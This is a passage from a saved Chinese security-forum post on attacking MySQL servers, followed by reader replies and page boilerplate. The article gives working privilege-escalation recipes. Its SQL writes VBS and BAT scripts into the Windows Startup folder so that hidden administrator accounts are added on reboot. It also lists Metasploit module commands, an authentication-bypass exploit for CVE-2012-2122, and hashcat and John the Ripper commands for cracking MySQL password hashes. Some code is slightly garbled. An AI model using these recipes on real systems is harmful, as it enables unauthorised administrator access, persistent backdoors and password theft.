+insert into a values ("set wshshell=createobject (""wscript.shell"" ) " ); 
+insert into a values ("a=wshshell.run (""cmd.exe /c net user aspnetaspnettest/add"",0)") ;
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators aspnet /add"",0) " ); 
+select \ from a;</code></pre>
+<ol>
+<li>导出vbs脚本到启动</li>
+</ol>
+<p>使用以下命令将刚才在a表中创建的vbs脚本导出到启动选项中。</p>
+
+<pre><code>select \ from a into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs";</code></pre>
+<p>导入成功后，系统重新启动时会自动添加密码为“1”且用户名称为“1”的用户到管理员组中。在实际使用过程中该脚本成功执行的几率比较低，有时候会出现不能导出的错误.</p>
+<p>推荐使用以下脚本：</p>
+
+<pre><code>show databases ;
+use test;
+show tables;
+create table b (cmd text); 
+insert into b values ("net user Aspnet123545345! /add");
+insert into b values ("net localgroup administrators Aspnet /add");
+insert into b values ("del b.bat");
+select  from b into outfile "C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\b.bat";</code></pre>
+<p>该脚本执行后虽然会闪现Dos窗口，如果有权限导入到启动选项中，则一定会执行成功，在虚拟机中通过MySQL连接器连接并执行以上命令后，在<code>C:\Documents and Settings\All Users\「开始」菜单\程序\启动</code>目录中会有刚才导出的b.bat脚本文件</p>
+<p>说明</p>
+<p>在不同的操作系统中<code>C:\Documents and Settings\All Users\「开始」菜单\程序\启动</code>目录文件名称可能会不同，这个时候就要将其目录换成相应的目录名称即可。例如如果是英文版本操作系统则其插入的代码为：</p>
+
+<pre><code>select  from b into outfile "C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\b.bat";</code></pre>
+<p>Windows 2008 Server的启动目录为：</p>
+
+<pre><code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iis.vbs</code></pre>
+<p>其vbs方法可以参考如下写法：</p>
+
+<pre><code>create table a (cmd text);
+insert into a values ("set wshshell=createobject (""wscript.shell"" ) " );
+insert into a values ("a=wshshell.run (""cmd.exe /c net user antian365 qwer1234!@# /add"",0) " );
+insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators antian365 /add"",0) " );
+select \ from a into outfile "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\iis.vbs";</code></pre>
+<p>3.msf下模块exploit/windows/mysql/mysql_start_up提权</p>
+
+<pre><code>use exploit/windows/mysql/mysql_start_up
+set rhost 192.168.2.1
+set rport 3306
+set username root
+set password 123456
+run</code></pre>
+<p><code>msf</code>下<code>mysql_start_up</code>提权有一定的几率，对英文版系统支持较好。</p>
+<h2>1.7Msf其它相关漏洞提权</h2>
+<p>1.Mysql身份认证漏洞及利用(CVE-2012-2122)</p>
+<p>当连接<code>MariaDB/MySQL</code>时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是<code>memcmp()</code>返回一个非零值，也会使<code>MySQL</code>认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。受影响的产品： All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 存在漏洞.</p>
+<p>MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23不存在漏洞.<br>
+MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not不存在漏洞.</p>
+
+<pre><code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump</code></pre>
+<p>2.exploit/windows/mysql/mysql_yassl_hello<br>
+3.exploit/windows/mysql/scrutinizer_upload_exec</p>
+<h2>1.8.mysql密码破解</h2>
+<h3>1.8.1cain工具破解mysql密码</h3>
+<p>使用UltraEdit-32编辑器直接打开user.MYD文件，打开后使用二进制模式进行查看，在root用户后面是一串字符串，选中这些字符串将其复制到记事本中，这些字符串即为用户加密值，例如506D1427F6F61696B4501445C90624897266DAE3。</p>
+<p>注意：</p>
+<p>（1）root后面的<code>“”</code>不要复制到字符串中。</p>
+<p>（2）在有些情况下需要往后面看看，否则得到的不是完整的MYSQLSHA1密码，总之其正确的密码位数是40位。</p>
+<p>安装cain工具，使用cracker，右键单击“Add tolist”将Mysql Hashes值加入到破解列表中，使用软件中的字典、暴力破解等方式来进行暴力破解。</p>
+<h3>1.8.2网站在线密码破解</h3>
+<p>1.cmd5.com破解。将获取的mysql值放在cmd5.com网站中进行查询，mysql密码一般都是收费的。</p>
+<p>2.somd5.com破解。Somd5.com是后面出现的一个免费破解网站，每次破解需要手工选择图形码进行破解，速度快，效果好，只是每次只能破解一个，而且破解一次后需要重新输入验证码。</p>
+<h3>1.8.3oclhash破解</h3>
+<p>hashcat支持很多种破解算法，免费开源软件，官方网站<a href="https://hashcat.net/hashcat/" target="_blank">https://hashcat.net/hashcat/</a>，破解命令：</p>
+<p>hashcat64.exe -m 200myql.hashpass.dict //破解MySQL323类型</p>
+<p>hashcat64.exe -m 300myql.hashpass.dict //破解MySQL4.1/MySQL5类型</p>
+<h3>1.8.4 John the Ripper password cracker</h3>
+<p>John the Ripper下载地址：<a href="http://www.openwall.com/john/h/john179w2.zip" target="_blank">http://www.openwall.com/john/h/john179w2.zip</a>，John the Ripper除了能够破解linux外，还能破解多种格式的密码。</p>
+
+<pre><code>Echo 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B&gt;hashes.txt
+John –format =mysql-sha1 hashes.txt
+john --list=formats | grep mysql //查看支持mysql密码破解的算法</code></pre>
+<p><img src="./Mysql数据库渗透及漏洞利用总结_files/6764230-c0bec5f95c6c5940.png"></p>
+<p>​</p>
+<p></p>
+                    
+                
+            </div>
+            
+            <span class="pull-right thumbs collection" data-action="topic" data-pk="1491">
+                
+                    <i class="fa fa-star-o"></i><span>1</span>
+                
+            </span>
+        </div>
+    </div>
+    
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">3 条回复</li>
+    </ol>
+    <div class="box-container">
+        
+            
+                <ul id="reply-7116">
+                    <li style="min-height: 30px">
+                        <div class="row1 user-info clearfix"> <!-- user info -->
+                             <!--有头像载入头像，没有头像载入默认头像 -->
+                                <img class="avatar pull-left" src="./Mysql数据库渗透及漏洞利用总结_files/1866_cf512b461aea983e25.png">
+                            
+
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xianzhi.aliyun.com/forum/user/1866/">笑然</a>
+                                <span>发表于：2017-11-04 14:48:54</span>
+                            </span>
+                            <span class="reply-jump reply reply-cont pull-right" data-nickname="笑然">回复Ta</span>
+                            <span class="thumbs pull-right" data-action="post" data-pk="7116" data-topic="1491">
+                                <i class="fa fa-thumbs-o-up"></i><span>0</span>
+                            </span>
+
+                            <div class="post-content markdown-body">
+                                <p>等内容</p>
+
+                            </div>
+                        </div>
+                        
+                        <hr>
+                    </li>
+                </ul>
+
+            
+                <ul id="reply-7126">
+                    <li style="min-height: 30px">
+                        <div class="row1 user-info clearfix"> <!-- user info -->
+                             <!--有头像载入头像，没有头像载入默认头像 -->
+                                <img class="avatar pull-left" src="./Mysql数据库渗透及漏洞利用总结_files/1037_63c8f1d13dbcec00fa.png">
+                            
+
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xianzhi.aliyun.com/forum/user/1037/">hades</a>
+                                <span>发表于：2017-11-06 09:14:30</span>
+                            </span>
+                            <span class="reply-jump reply reply-cont pull-right" data-nickname="hades">回复Ta</span>
+                            <span class="thumbs pull-right" data-action="post" data-pk="7126" data-topic="1491">
+                                <i class="fa fa-thumbs-o-up"></i><span>0</span>
+                            </span>
+
+                            <div class="post-content markdown-body">
+                                <p><a href="https://xianzhi.aliyun.com/forum/user/3207/">@simeon</a> 已经修复</p>
+
+                            </div>
+                        </div>
+                        
+                        <hr>
+                    </li>
+                </ul>
+
+            
+                <ul id="reply-7175">
+                    <li style="min-height: 30px">
+                        <div class="row1 user-info clearfix"> <!-- user info -->
+                            
+                                <img class="avatar pull-left" src="./Mysql数据库渗透及漏洞利用总结_files/default_avatar.png">
+                            
+
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xianzhi.aliyun.com/forum/user/3087/">小歪</a>
+                                <span>发表于：2017-11-07 10:26:40</span>
+                            </span>
+                            <span class="reply-jump reply reply-cont pull-right" data-nickname="小歪">回复Ta</span>
+                            <span class="thumbs pull-right" data-action="post" data-pk="7175" data-topic="1491">
+                                <i class="fa fa-thumbs-o-up"></i><span>0</span>
+                            </span>
+
+                            <div class="post-content markdown-body">
+                                <p>可否转载呢？公众号：关注安全技术</p>
+
+                            </div>
+                        </div>
+                        
+                        <hr>
+                    </li>
+                </ul>
+
+            
+        
+    </div>
+</div>
+<div class="modal-box hidden"></div>
+<div class="modal-confirm hidden post-confirm">
+    <div class="confirm-info">
+        确定<span></span>吗
+    </div>
+    <button class="btn btn-danger sure">确定</button>
+    <button class="btn btn-default cancel">取消</button>
+</div>
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <form action="https://xianzhi.aliyun.com/forum/topic/1491/" method="post">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="FKKSdKBRdqXgEkCz9VBgsX56BFD1yWjKiPzlUoRgOlgICJ1AAv7QPLxiOz9xnvwa">
+                        <p id="editormd" class="editormd editormd-vertical" style="width: 100%; height: 500px;"> <textarea class="topic-form editormd-markdown-textarea" cols="40" id="id_content" maxlength="10000" name="content" rows="10" required="" placeholder="说点什么吧..." style="display: none;"></textarea><a href="javascript:;" class="fa fa-close editormd-preview-close-btn"></a>
+<textarea class="editormd-html-textarea" name="editormd-html-code"></textarea>
+<div class="editormd-preview"><div class="markdown-body editormd-preview-container"></div></div>
+<div class="editormd-container-mask" style="display:block;"></div>
+<div class="editormd-mask"></div></p><div class="CodeMirror cm-s-default CodeMirror-wrap CodeMirror-empty" style="font-size: 13px; width: 660px; margin-top: 78px; height: 423px;"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 51px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" style="position: absolute; padding: 0px; width: 1000px; height: 1em; outline: none;" tabindex="0"></textarea></div><div class="CodeMirror-vscrollbar" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 39px; margin-bottom: -7px; border-right-width: 23px; min-height: 30px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines"><div style="position: relative; outline: none;"><pre class="CodeMirror-placeholder" style="height: 0px; overflow: visible;">说点什么吧...</pre><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor" style="left: 12px; top: 0px; height: 22px;">&nbsp;</div></div><div class="CodeMirror-code"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-wrapper" style="left: -39px; width: 39px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 20px;">1</div></div><pre class=""><span style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 23px; width: 1px; top: 30px;"></div><div class="CodeMirror-gutters" style="height: 443px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 28px;"></div><div class="CodeMirror-gutter CodeMirror-foldgutter"></div></div></div></div><a href="javascript:;" class="fa fa-close editormd-preview-close-btn"></a>
+<textarea class="editormd-html-textarea" name="editormd-html-code"></textarea>
+<div class="editormd-preview" style="display: none;"><div class="markdown-body editormd-preview-container"></div></div>
+<div class="editormd-container-mask" style="display: none;"></div>
+<div class="editormd-mask"></div><div class="editormd-toolbar" style="display: block;"><div class="editormd-toolbar-container"><ul class="editormd-menu"><li><a href="javascript:;" title="粗体" unselectable="on"><i class="fa fa-bold" name="bold" unselectable="on"></i></a></li><li><a href="javascript:;" title="横线" unselectable="on"><i class="fa fa-minus" name="hr" unselectable="on"></i></a></li><li><a href="javascript:;" title="斜体" unselectable="on"><i class="fa fa-italic" name="italic" unselectable="on"></i></a></li><li><a href="javascript:;" title="删除线" unselectable="on"><i class="fa fa-strikethrough" name="del" unselectable="on"></i></a></li><li><a href="javascript:;" title="引用" unselectable="on"><i class="fa fa-quote-left" name="quote" unselectable="on"></i></a></li><li class="divider" unselectable="on">|</li><li><a href="javascript:;" title="标题1" unselectable="on"><i class="fa editormd-bold" name="h1" unselectable="on">H1</i></a></li><li><a href="javascript:;" title="标题2" unselectable="on"><i class="fa editormd-bold" name="h2" unselectable="on">H2</i></a></li><li><a href="javascript:;" title="标题3" unselectable="on"><i class="fa editormd-bold" name="h3" unselectable="on">H3</i></a></li><li><a href="javascript:;" title="标题4" unselectable="on"><i class="fa editormd-bold" name="h4" unselectable="on">H4</i></a></li><li><a href="javascript:;" title="将每个单词首字母转成大写" unselectable="on"><i class="fa" name="ucwords" style="font-size:20px;margin-top: -3px;">Aa</i></a></li><li class="divider" unselectable="on">|</li><li><a href="javascript:;" title="无序列表" unselectable="on"><i class="fa fa-list-ul" name="list-ul" unselectable="on"></i></a></li><li><a href="javascript:;" title="有序列表" unselectable="on"><i class="fa fa-list-ol" name="list-ol" unselectable="on"></i></a></li><li><a href="javascript:;" title="添加表格" unselectable="on"><i class="fa fa-table" name="table" unselectable="on"></i></a></li><li><a href="javascript:;" title="链接" unselectable="on"><i class="fa fa-link" name="link" unselectable="on"></i></a></li><li><a href="javascript:;" title="添加图片" unselectable="on"><i class="fa fa-picture-o" name="image" unselectable="on"></i></a></li><li><a href="javascript:;" title="行内代码" unselectable="on"><i class="fa fa-code" name="code" unselectable="on"></i></a></li><li><a href="javascript:;" title="预格式文本 / 代码块（缩进风格）" unselectable="on"><i class="fa fa-file-code-o" name="preformatted-text" unselectable="on"></i></a></li><li><a href="javascript:;" title="代码块（多语言风格）" unselectable="on"><i class="fa fa-file-code-o" name="code-block" unselectable="on"></i></a></li><li class="divider" unselectable="on">|</li><li><a href="javascript:;" title="搜索" unselectable="on"><i class="fa fa-search" name="search" unselectable="on"></i></a></li><li><a href="javascript:;" title="HTML实体字符" unselectable="on"><i class="fa fa-copyright" name="html-entities" unselectable="on"></i></a></li><li><a href="javascript:;" title="开启实时预览" unselectable="on"><i class="fa fa-eye" name="watch" unselectable="on"></i></a></li><li><a href="javascript:;" title="全窗口预览HTML（按 Shift + ESC还原）" unselectable="on"><i class="fa fa-desktop" name="preview" unselectable="on"></i></a></li><li><a href="javascript:;" title="全屏（按ESC还原）" unselectable="on"><i class="fa fa-arrows-alt" name="fullscreen" unselectable="on"></i></a></li></ul></div></div><p></p>
+                        <input type="hidden" id="csessionid" name="csessionid">
+                        <input type="hidden" id="sig" name="sig">
+                        <input type="hidden" id="token" name="token">
+                        <input type="hidden" id="scene" name="scene">
+                        <div id="_umfp" style="display:inline;width:1px;height:1px;overflow:hidden"></div>
+
+                        <div class="nc-container hh_pt">
+                            <input type="submit" class="btn btn-info pull-right" style="margin: 2px 0 0 3% " value="发帖">
+                            <div id="dom_id" class="hh_merge nc-container" data-nc-idx="1">
+<div id="nc_1_wrapper" class="nc_wrapper">
+<div id="nc_1_n1t" class="nc_scale">
+<div id="nc_1__bg" class="nc_bg"></div>
+<span id="nc_1_n1z" class="nc_iconfont btn_slide"></span>
+<div id="nc_1__scale_text" class="scale_text slidetounlock"><span class="nc-lang-cnt" data-nc-lang="_startTEXT">请按住滑块，拖动到最右边</span></div>
+<div id="nc_1_clickCaptcha" class="clickCaptcha">
+<div class="clickCaptcha_text">
+<b id="nc_1__captcha_text" class="nc_captch_text"></b>
+<i id="nc_1__btn_2" class="nc_iconfont nc_btn_2 btn_refresh"></i>
+</div>
+<div class="clickCaptcha_img"></div>
+<div class="clickCaptcha_btn"></div>
+</div>
+<div id="nc_1_imgCaptcha" class="imgCaptcha">
+<div class="imgCaptcha_text"><input id="nc_1_captcha_input" maxlength="6" type="text" style="ime-mode:disabled"></div>
+<div class="imgCaptcha_img" id="nc_1__imgCaptcha_img"></div>
+<i id="nc_1__btn_1" class="nc_iconfont nc_btn_1 btn_refresh" onclick="document.getElementById(&#39;nc_1__imgCaptcha_img&#39;).children[0].click()"></i>
+<div class="imgCaptcha_btn">
+<div id="nc_1__captcha_img_text" class="nc_captcha_img_text"></div>
+<div id="nc_1_scale_submit" class="nc_scale_submit"></div>
+</div>
+</div>
+<div id="nc_1_cc" class="nc-cc"></div>
+<i id="nc_1__voicebtn" tabindex="0" role="button" class="nc_voicebtn nc_iconfont" style="display:none"></i>
+<b id="nc_1__helpbtn" class="nc_helpbtn"><span class="nc-lang-cnt" data-nc-lang="_learning">了解新功能</span></b>
+</div>
+<div id="nc_1__voice" class="nc_voice"></div>
+</div>
+</div>
+                        </div>
+                    </form>
+
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.post-action,.topic-action').css('cursor', 'pointer').click(function () {
+                var text = $(this).text();
+                var action = $(this).attr('data-action');
+                var pk = $(this).attr('data-pk');
+                $('.confirm-info span').text(text);
+                $('.modal-box,.post-confirm').removeClass('hidden');
+                $('body').css('overflow', 'hidden');
+                var url = "/forum/post/manage/";
+                if ($(this).hasClass('topic-action')) {
+                    url = "/forum/topic/manage/"
+                }
+                $('.sure').click(function () {
+                    $.ajax({
+                        url: url,
+                        method: "post",
+                        dataType: "json",
+                        data: {'action': action, 'pk': pk},
+                        success: function (arg) {
+                            if (!arg.status) {
+                                alert(arg.message);
+                                $('.modal-confirm,.modal-box').addClass('hidden');
+                                $('body').css('overflow', '')
+                            } else {
+                                window.location.reload()
+                            }
+                        }
+                    })
+                });
+            });
+
+            $('.cancel,.modal-box').click(function () {
+                $('.modal-confirm,.modal-box').addClass('hidden');
+            });
+
+            function thumb_change(ele) {
+                var count = ele.children('span').html();
+                if (ele.children('i').hasClass('fa-thumbs-o-up') || ele.children('i').hasClass('fa-star-o')) {
+                    ele.children('span').html(Number(count) + 1);
+                    if (ele.children('i').hasClass('fa-thumbs-o-up')) {
+                        ele.children('i').removeClass('fa-thumbs-o-up').addClass('fa-thumbs-up')
+                    }
+                    if ((ele.children('i').hasClass('fa-star-o'))) {
+                        ele.children('i').removeClass('fa-star-o').addClass('fa-star')
+                    }
+                }else {
+                    if (ele.children('i').hasClass('fa-thumbs-up') || ele.children('i').hasClass('fa-star')) {
+                    ele.children('span').html(Number(count) - 1);
+                    if (ele.children('i').hasClass('fa-thumbs-up')) {
+                        ele.children('i').removeClass('fa-thumbs-up').addClass('fa-thumbs-o-up')
+                    }
+                    if ((ele.children('i').hasClass('fa-star'))) {
+                        ele.children('i').removeClass('fa-star').addClass('fa-star-o')
+                    }
+                }
+                }
+
+            }
+
+            $('.thumbs,.collection').click(function () {
+                var action = $(this).attr('data-action');
+                var pk = $(this).attr('data-pk');
+                var topic = $(this).attr('data-topic');
+                var ele = $(this);
+                $.ajax({
+                    url: "/forum/approval/",
+                    dataType: 'json',
+                    method: 'post',
+                    data: {'action': action, 'pk': pk, 'csrfmiddlewaretoken': 'FKKSdKBRdqXgEkCz9VBgsX56BFD1yWjKiPzlUoRgOlgICJ1AAv7QPLxiOz9xnvwa'},
+                    success: function (data) {
+                        if (data.not_authenticated) {
+                            window.location.href = "https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F1491%2F&amp;from_type=xianzhi"
+                        }
+                        if (data.status) {
+                            thumb_change(ele);
+                        } else {
+                            return null
+                        }
+                    }
+                });
+
+            });
+
+            
+                var nc = new noCaptcha();
+                var nc_appkey = 'FFFF000000000175CCFB';  // 应用标识,不可更改
+                var nc_scene = 'login';  //场景,不可更改
+                var nc_token = [nc_appkey, (new Date()).getTime(), Math.random()].join(':');
+                var nc_option = {
+                    renderTo: '#dom_id',//渲染到该DOM ID指定的Div位置
+                    appkey: nc_appkey,
+                    scene: nc_scene,
+                    token: nc_token,
+                    trans: '{"name1":"code0"}',//测试用，特殊nc_appkey时才生效，正式上线时请务必要删除；code0:通过;code100:点击验证码;code200:图形验证码;code300:恶意请求拦截处理
+                    callback: function (data) {// 校验成功回调
+                        document.getElementById('csessionid').value = data.csessionid;
+                        document.getElementById('sig').value = data.sig;
+                        document.getElementById('token').value = nc_token;
+                        document.getElementById('scene').value = nc_scene;
+                    }
+                };
+                nc.init(nc_option);
+            
+        });
+    </script>
+    
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/editor-settings.js"></script>
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/marked.min.js"></script>
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/prettify.min.js"></script>
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/raphael.min.js"></script>
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/underscore.min.js"></script>
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/sequence-diagram.min.js"></script>
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/flowchart.min.js"></script>
+        <script src="./Mysql数据库渗透及漏洞利用总结_files/jquery.flowchart.min.js"></script>
+    
+
+        </div>
+        <div class="span3 offset panel-body pull-right">
+            
+                
+                    <div class="box">
+                        <div class="info-panel">
+                            <a href="https://xianzhi.aliyun.com/forum/avatar/" class="hh_hone" style="display: block; width: 50px">
+                                
+                                    <img class="avatar" src="./Mysql数据库渗透及漏洞利用总结_files/default_avatar.png">
+                                
+                            </a>
+                            <a href="https://xianzhi.aliyun.com/forum/user/4576/" class="hh_htow">
+                            <span style="margin-left: 10px;">
+                                    
+                                        <strong>sq1map</strong>
+                                    
+                                <div class="level-info">
+                                <img src="./Mysql数据库渗透及漏洞利用总结_files/1-1.gif" class="hh_bronzemember" height="50" alt="sq1map" title="初级攻城狮">
+                                <span>初级攻城狮</span>
+                            </div>
+                            </span>
+                            </a>
+                            <hr>
+                            <div class="intro">
+                                <p>个人简介：</p>
+                                
+                                    <span>这个人很懒，什么都没留下</span>
+                                
+                                <hr>
+                            </div>
+                            <p>
+                                <i class="fa fa-pencil"></i>
+                                <a class="info-content" href="https://xianzhi.aliyun.com/forum/topic/create/">
+                                    <span>创建新帖子</span></a>
+                            </p>
+                            <hr>
+                            
+                                <i class="fa fa-bell"></i>
+                                <a class="info-content" href="https://xianzhi.aliyun.com/forum/notify/">
+                                    <span>暂无新消息</span></a>
+                            
+                            <hr>
+                            <i class="fa fa-sign-out"></i>
+                            <a class="info-content" href="https://account.aliyun.com/logout/logout.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Ftopic%2F1491%2F">
+                                <span>注销</span></a>
+                        </div>
+                    </div>
+                
+                <div class="box">
+                    <div class="info-panel" style="padding-bottom: 0!important; color: red">
+                        <i class="fa fa-fire"></i><a class="info-content " href="https://xianzhi.aliyun.com/forum/live/" style="color: red; font-weight: bold"><span>先知创新大会直播中...</span></a>
+                    </div>
+                </div>
+                <div class="box">
+                    <div class="info-panel" style="padding-bottom: 0!important;">
+                        <i class="fa fa-rss"></i><a class="info-content" href="https://xianzhi.aliyun.com/forum/feed/"><span>RSS订阅</span></a>
+                    </div>
+                </div>
+
+                <div class="box front-box">
+                    <div class="info-panel">
+                        <span><strong>扫一扫，更多干货等着你</strong></span>
+                    </div>
+                    <hr>
+                    <div class="front-img">
+                        <img src="./Mysql数据库渗透及漏洞利用总结_files/xianzhi_qr_code.jpg" alt="">
+                    </div>
+                </div>
+            
+        </div>
+        <div class="to-top">
+            <span><img src="./Mysql数据库渗透及漏洞利用总结_files/totop.png" width="50" height="50" alt="返回顶部"></span>
+        </div>
+        <div class="to-bottom">
+            <span><img src="./Mysql数据库渗透及漏洞利用总结_files/tobottom.png" width="50" height="50" alt="跳转底部"></span>
+        </div>
+    </div>
+
+    <div class="row2">
+        <div class="footer" style="clear: both">
+            <div class="w1200">
+                <div class="pull-left">
+                    <span>友情链接: </span>
+                    <a href="https://www.secpulse.com/" target="_blank">安全脉搏</a> |
+                    <a href="https://www.easyaq.com/" target="_blank">E安全</a> |
+                    <a href="http://www.leavesongs.com/" target="_blank">phithon</a> |
+                    <a href="http://www.77169.cn/" target="_blank">华盟网</a> |
+                    <a href="http://www.mottoin.com/" target="_blank">MottoIN</a> |
+                    <a href="http://www.4hou.com/" target="_blank">嘶吼</a> |
+                    <a href="http://www.nsoad.com/" target="_blank">网络攻防小组</a> |
+                    <a href="https://www.sec-wiki.com/" target="_blank">SecWiki</a>
+                </div>
+                <div class="pull-right">CSS Powered By 0xbug</div>
+            </div>
+        </div>
+    </div>
+
+</div>
+<!-- main content end -->
+
+
+
+<script src="./Mysql数据库渗透及漏洞利用总结_files/z_stat.php" language="JavaScript"></script><script src="./Mysql数据库渗透及漏洞利用总结_files/core.php" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1260716569" target="_blank" title="站长统计">站长统计</a><script src="./Mysql数据库渗透及漏洞利用总结_files/core(1).php" charset="utf-8" type="text/javascript"></script><a href="http://www.cnzz.com/stat/website.php?web_id=1260716569" target="_blank" title="站长统计">站长统计</a><a href="http://www.cnzz.com/stat/website.php?web_id=1260716569" target="_blank" title="站长统计">站长统计</a>
+
+</body></html>
